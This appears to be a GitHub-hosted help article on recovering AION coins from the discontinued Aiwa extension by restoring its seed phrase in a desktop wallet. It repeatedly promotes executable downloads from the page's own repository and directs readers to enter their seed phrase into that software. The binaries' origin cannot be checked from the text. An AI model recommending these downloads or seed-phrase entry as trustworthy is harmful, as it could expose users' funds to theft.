![Aion Wallet](assets/banner-article.png)

# Aion Aiwa wallet recovery: getting coins out

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

Coins held in the Aiwa browser extension come back by restoring Aiwa's seed phrase in the current Aion desktop wallet, which produces the same address and the same balance without any transfer between them.

Aiwa itself is no longer maintained by its authors, so the extension is not the place to keep funds. The recovery is a restore, not a migration, and it does not require the old extension to work.

## You'll see this if

- You used the Aiwa extension years ago and still have AION at the address it created.
- The extension no longer loads, or its store listing has disappeared.
- You have twelve or twenty-four words written down from Aiwa and are not sure they are still useful.
- You have the extension's keystore export and its password.

## What Aiwa was

Aiwa was a browser-extension wallet for Aion built by BlockX Labs and funded through a community grant, and it was one of the more widely used ways to hold AION during the network's early years. It has been withdrawn, and its repository has not been active for some time.

None of that affects the keys. An address created by Aiwa is an ordinary Aion account, and the phrase behind it restores in any wallet that follows the same derivation.

## The restore, step by step

1. Install the current Aion desktop release from the release page.
2. Choose restore rather than create, and select the seed-phrase option.
3. Enter the Aiwa words in the exact order they were written.
4. Set a new password for the new installation.
5. Compare the resulting address with the address Aiwa showed you. The first and last characters are enough to confirm it.
6. Check the balance on a block explorer if it does not appear immediately, then wait for the wallet to reach a node.

If the phrase restores a different address, the words may belong to a different wallet, or one word may have been transcribed with the wrong spelling. A single wrong word produces a valid wallet at a different address, which is why the address comparison comes before any other troubleshooting.

## When the phrase is missing

An exported keystore file from Aiwa imports into the current release if its password is known, and it restores the single account the file belongs to.

If neither exists, the account cannot be opened. That is the same limit every non-custodial wallet has, and the [Aion wallet forgot password](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-forgot-password.md) article explains it without offering a false route out.

Be careful with the recovery services that advertise Aiwa support. A wallet recovery business cannot decrypt a keystore without the password, and any that asks for the phrase is taking the funds rather than recovering them.

## What to check before you move anything

Confirm the restored address matches the Aiwa one, and confirm the balance on an explorer. Only then decide whether to keep the funds at that address or move them to a new wallet created in the current release.

Moving them is a normal send with a fee, and it is optional. Staying at the Aiwa address is safe as long as the phrase or keystore is backed up, because the address does not depend on the extension still existing.

## What to do if the extension is still installed

An extension that still opens is worth using as a reference, not as a wallet. Read the address from it, confirm it matches the restored wallet, and export a keystore file while the interface still works.

Then stop using it. A wallet whose authors have withdrawn support receives no security fixes, and a browser extension with access to a page is a larger surface than a desktop application with no such access.

Removing it afterwards is a reasonable step once the address and the backup are recorded. The [Aion wallet download verify](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-download-verify.md) guide covers the installer you replace it with.

If you are unsure which credential you still hold, the [Aion wallet login options](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-login-options.md) guide maps each one to what it restores, and the [Aion wallet forgot password](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-forgot-password.md) article is the honest account of what happens when the phrase is gone and the keystore password with it.

## Prevention

Keep the phrase on paper, in two places, and keep an exported keystore as the second line of defence.

If you create a new wallet in the current release, back it up before funding it, and keep the old phrase until the new wallet has been tested with a small transfer.

Update the desktop application when a release appears; the extension that needed replacing is the clearest argument for not leaving a wallet inside a browser.

## Frequently asked questions

### Is Aiwa still available to install?

No. Its authors withdrew it, and it should not be reinstalled from a third-party mirror even if one is offered.

### Do I need Aiwa to recover the coins?

No. The phrase or the keystore file is enough, and the current desktop wallet is what reads them.

### My Aiwa phrase has 12 words. Is that still valid?

Yes. Both 12-word and 24-word phrases are BIP-39 standard and restore in the current release.

### Can I keep using the Aiwa address?

Yes. An address does not expire. Keep the backup, and use the desktop wallet to sign from it.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [Aion keystore file restore](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-keystore-file-restore.md) - importing an exported file.
- [Aion wallet login options](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-login-options.md) - the three routes into a wallet.
- [Aion desktop wallet migration](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-desktop-wallet-migration.md) - the equivalent move out of an older desktop build.
- [Aion wallet transaction history](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-transaction-history.md) - confirming what the old address did.
